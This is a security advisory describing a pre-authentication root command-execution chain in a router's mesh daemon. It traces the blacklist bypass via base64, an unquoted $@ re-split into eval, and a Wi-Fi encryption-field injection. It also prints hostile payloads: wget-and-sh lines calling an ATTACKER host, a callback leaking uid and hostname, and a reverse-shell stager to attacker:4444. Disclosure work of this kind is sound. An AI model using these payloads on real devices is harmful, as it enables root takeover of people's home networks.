# V2 — pre-authentication root command execution (RCE)

**Severity: Critical.** After the same forged, credential-free handshake as V1, an
unauthenticated network peer reaches a shell `eval` that runs as **root**.
**Confirmed end-to-end on physical hardware** via the OTA combined chain (V1 admin
takeover → encryption-field injection → V2 trigger → interactive root shell over
Wi-Fi). The direct injection variants (CAP/LAN ~4-char one-shot, RE/WAN ~36-byte
ungated) are confirmed in emulation. Three paths to the same sink, with different
payload budgets — see *Scope & severity*.

## Root cause

A C-level character blacklist in `cab_meshd` is defeated because the attacker's
bytes are carried through **`base64`**, and a downstream root shell script
**re-splits its own arguments** and **`base64 -d`**-decodes one straight into an
**`eval`**.

## The C side is not gated

The `type-7` handler (`0x63e0`) that drives `cap_init` has **no `NETMODE` and no
state gate** — its only preconditions are: connection/body non-NULL, server mode
(`global(0x230)!=0`), `body[0]==1`, and not dry-run (`global(0x1e0)==0`). It then
calls the builder (`0x652c → 0xa3bc`), which base64-**encodes** the wire fields
(`0x2bf8`), runs `check_injection` on the *base64* (`0x9308` — structurally blind),
`snprintf`s the `cap_init` template, and **`system()`s it (`0xa598`)**. NETMODE is
checked only later, in the shell.

## The shell chain (root)

```
mesh_connect.sh:6      . /lib/mimesh/mimesh_init.sh          # sourced: same shell
mesh_connect.sh:1633   cap_init) run_with_lock do_cap_init "$2" … "$9"   # correctly quoted
mesh_connect.sh:22     $@                                     # in run_with_lock: UNQUOTED -> re-splits
do_cap_init:1014       local bh_ssid=$(printf "%s" "$6" | base64 -d)     # decodes attacker bytes back
do_cap_init:1073       buff="{…\"bh_ssid\":\"${bh_ssid}\"…}"; mimesh_init "$buff"
mimesh_init.sh:717     eval "$key=\"`json_get_value \"$params\" \"$key\"`\""   # executes them, as root
```

`check_injection` (blacklist `0xe2c9`: `` @`$#,;'\"[]&*()|<> ``) never sees the
payload because `cab_meshd` base64-encodes the field first; `run_with_lock`'s
unquoted `$@` re-splits the arguments so the planted field lands as `do_cap_init`'s
`$6`; and `base64 -d` restores the blocked characters straight into `eval`.

## Delivery (CAP/LAN path)

The attacker-controlled field that reaches `$6` is the 19-byte **plant** at type-4
`body[0x90]` (`→ conn+0x10e`, `strncpy` `0x6058`). A five-word pad shifts a base64
payload into `$6`:

```
type-4 body[0x90] = "a a a a a " + base64(`CMD`)
  -> run_with_lock $@ re-splits -> do_cap_init $6 = base64(`CMD`)
  -> base64 -d -> `CMD` -> mimesh_init eval  (root)
```

Full driver: `poc/rce_poc.py --cmd '…'` (or `poc/handshake.py --plant '…'`).

## Proof (emulation, stock binary + scripts)

Under the qemu-user harness running the real `cab_meshd` with a clean config
(`NETMODE` unset), a client that completed `4→5→7` and put
`base64("`>W`")` in the plant caused `mimesh_init.sh:717`'s `eval` to execute the
redirect **as root**, creating file `/W` (root:root). Independently reproduced.
`bh_ssid` also showed `uid=0(root)…` for an `` `id` `` payload. This is arbitrary
root command execution from an unauthenticated TCP client, through the full daemon
path.

## OTA combined chain — confirmed on hardware

The `mgmt_2g` and `mgmt_5g` keys in the `mimesh_init` eval sink (`:717`) are sourced
from `uci get wireless.<iface>.encryption` (`do_cap_init:1007/1010`). Unlike
`bh_ssid`/`bh_pswd`, these values are **not** base64-laundered by the daemon — they
flow from UCI into the `eval` **raw**. They are admin-settable via
`api/xqnetwork/set_wifi_without_restart`, and the `encryption` parameter is on the
`hackCheck` **exemption list** (like password/SSID fields), so arbitrary shell
metacharacters — including `"`, `\`, spaces, `#` — pass through the web layer and
into UCI unsanitised.

### The chain

| Step | What | Requires |
|---|---|---|
| 1 | V1 leaks `web_passwd256` over TCP 19553 (pre-auth) → mint admin `stok` | Wi-Fi adjacency |
| 2 | `set_wifi_without_restart` plants payloads in `encryption` for 2.4 GHz and 5 GHz bands | Admin `stok` from step 1 |
| 3 | `rce_poc.py`-style `4→5→7` trigger fires `cap_init` | Wi-Fi adjacency (same as step 1) |
| 4 | `do_cap_init` reads `encryption` via `uci get` → `mimesh_init` `eval` runs it as **root** | — |

### Payload construction

The 2.4 GHz `encryption` carries the fetch stage, the 5 GHz carries the exec stage:

```
2.4G encryption = \" wget http://ATTACKER:8000/s -O /tmp/x #
5G   encryption = \" sh /tmp/x #
```

When `mimesh_init.sh:717` evaluates:
```
eval "mgmt_2g=\"`json_get_value \"$params\" \"mgmt_2g\"`\""
```
`parse_json` un-escapes `\"` → `"`. The eval becomes:
```
mgmt_2g="" wget http://ATTACKER:8000/s -O /tmp/x #"..."
```
The shell assignment-prefix trick (`VAR=val cmd`) runs `wget` as root. The `#`
comments out the trailing garbage. The 5 GHz band fires `sh /tmp/x` the same way.

### Why hackCheck doesn't block it

`XQSecureUtil.hackCheck` (applied by `luci.http.formvalue`) blocks `` ;|$&`\n ``
in request parameters. But `encryption` is on the **36-name exemption list** (along
with `password`, `ssid`, `username`, etc.) — the web layer passes it through
unsanitised because users can legitimately type special characters in Wi-Fi passwords.
The `\"` breakout and `#` comment need only `"`, `\`, `#`, and spaces — none of which
are on the `hackCheck` blacklist even for non-exempt parameters.

### Payload budget

**Unlimited.** The `encryption` UCI value has no meaningful length cap, unlike the
CAP plant (~4 chars) or RE `bh_ssid` (~36 bytes). This makes the OTA chain the
practical exploitation path: it can deliver a full `wget|sh` stager, a reverse shell,
or any arbitrary script.

### Self-repairing payload

The stager (`/s`) served by the attacker:
1. Sends a proof callback: `GET /pwned?uid=$(id -u)_user=$(id -un)_host=$(uname -n)`
2. Self-repairs the Wi-Fi: a background loop detects the poisoned `encryption` values,
   replaces them with valid `psk2` + a known key, and runs `wifi reload` — so the AP
   comes back online and the attacker's laptop can reconnect.
3. Opens a persistent reconnecting reverse shell (`mkfifo` + `nc` to attacker:4444)
   that retries every 10 seconds.

The device stays fully operational throughout. The attacker gets an interactive root
shell over Wi-Fi without the target ever going offline.

### Proof (physical hardware)

Reproduced multiple times on a physical RD03v2 (`romversion 2.0.28`):

```
*** ROOT CALLBACK: /pwned?uid=0_user=root_host=XiaoQiang ***
```

Interactive root shell output:
```
uid=0(root) gid=0(root)
Linux XiaoQiang 4.4.60 #0 SMP PREEMPT ... armv7l GNU/Linux
RD03v2
```

Full evidence in `evidence/hardware-validation.md`. PoC: `poc/ota_rce.py`.

## Scope & severity — three variants

**OTA combined chain** (V1 → admin API → V2 trigger, over Wi-Fi):
- **Confirmed end-to-end on physical hardware** (above).
- **Unlimited payload budget** — no length cap on the `encryption` UCI value.
- Requires the V1 admin takeover first (automated, pre-auth, same Wi-Fi adjacency).
- One-shot (the `cap_init` trigger self-gates with `NETMODE=whc_cap`), but the full
  payload runs before the gate closes — a single execution delivers a complete
  reverse shell + persistence.

**CAP / LAN path** (`cab_meshd -S -i br-lan`, started when `INITTED=YES` — an
initialised/operating router; the same surface V1 uses):
- **Confirmed in emulation** (root-owned file via daemon-driven trigger).
- **~4-character one-shot.** The plant is 19 bytes; after the pad, ~8 base64 chars
  → ~6 raw bytes incl. backticks → a ~4-char command (`id`, `>W`, …). The larger
  `%s` args (`$6/$7` in the daemon template) are `base64(CAP's own SSID/pswd)`, not
  attacker-controlled, so they cannot carry the payload. And the first `cap_init`
  self-sets `NETMODE=whc_cap` (persisted across reboot), gating the sink until a
  factory reset. A tightly-budgeted but real root primitive.

**RE / WAN path** (`cab_meshd -C -i <wan>`, started on a *fresh/unconfigured*
device — `INITTED!=YES`, `proto=dhcp`): **ungated, repeatable, ~36-byte remote root
RCE; every link proven live in emulation, the full single-run chain blocked only by
an emulator-only WAN-gateway check.**
- **Ungated & repeatable.** `do_re_init` (`mesh_connect.sh:203-261`) has **no
  `NETMODE` guard** and calls `mimesh_init` unconditionally (`:257`); the `INITTED`
  gate `check_re_initted` (`:11`) is **dead code — never called**. Unlike the CAP
  path it does **not** self-gate, so it is **repeatable**, not one-shot.
- **Sink proven live (root):** running the stock `mesh_connect.sh re_init … <base64
  payload> …` in a `rootfs28` chroot created a **root-owned** file. (`json_get_value`
  → `/usr/sbin/parse_json`, a real ELF on `PATH`; the `eval` fires.)
- **Delivery & budget.** The daemon RE builder (`0xa950`, called from the **type-6**
  handler at `0x6a30`) reads the **raw wire body** and base64-encodes `conn+0xe6` →
  `re_init %s7` = `do_re_init $7` = `bh_ssid` (the eval sink), and `conn+0x107` →
  `%s8` = `bh_pswd`. The base64 encoder (`0x2bf8`) rejects input that would overflow
  the destination, capping **`bh_ssid ≤ 36 bytes`** and **`bh_pswd ≤ 66 bytes`** —
  not unlimited, but far larger than the CAP path's ~4 bytes and **enough for a
  fetch-and-exec stager** (e.g. `` `wget http://a/x|sh` ``, 18 B). The base64
  laundering means these carry arbitrary bytes past `check_injection`.
- **Discovery proven live.** The RE broadcasts `MIROUTE_RE_DDv1.0` (18 B) to
  `255.255.255.255:19553` and accepts a response of `MIROUTE_CAP_DDv1.0` (18 B)
  **followed by the CAP's IP string at offset `0x12`** (≥16 B), delivered as a
  genuine UDP datagram inbound on its WAN. With that, the live daemon logs *"Found
  CAP in L2-net"*. TLS is no barrier — the RE client sets `SSL_VERIFY_NONE` (`0x338c`)
  and presents no client certificate, so a self-signed rogue CAP completes the
  handshake.
- **Outstanding.** The full one-run chain (rogue CAP → TLS → type-6 → root file) was
  not stitched under emulation: after *"Found CAP"* the RE gates its outbound TCP
  connect on a **WAN-gateway environment check** (`/tmp/cab_meshd_gw_ip`, WAN link)
  that a bare veth netns cannot satisfy — an **emulation limitation, not a gate on
  the vulnerability** (a real fresh unit has a WAN gateway). Every link is
  individually proven; the single-run stitch and the RE-side auth key for the
  reversed handshake remain.

## Honest status

**The OTA combined chain (V1 → V2) is confirmed end-to-end on physical hardware.**
The full sequence — pre-auth admin takeover, encryption-field injection,
`cap_init` trigger, root callback (`uid=0`), interactive root shell — was reproduced
multiple times on a physical RD03v2 running `romversion 2.0.28`. The device stayed
online throughout (self-repairing payload). This is the definitive proof that V2 is
a real, exploitable root RCE on stock hardware.

The direct injection variants remain at their prior evidence levels: the **CAP/LAN
path** is confirmed in emulation (daemon-driven root-owned file); the **RE/WAN path**
has each link independently confirmed in emulation but the full single-run chain was
not stitched (blocked by an emulator-only WAN-gateway check, not a gate on the bug).
Both were independently re-verified by a separate reviewer, which also corrected the
earlier "uncapped" wording to the measured ~36/~66-byte budget.

## Fix
Quote `$@` in `run_with_lock`; never `base64 -d`→`eval` peer data; don't rely on the
base64-launderable C blacklist; and close the shared entry point (per-device mesh
auth, client-cert TLS). See `remediation.md`.
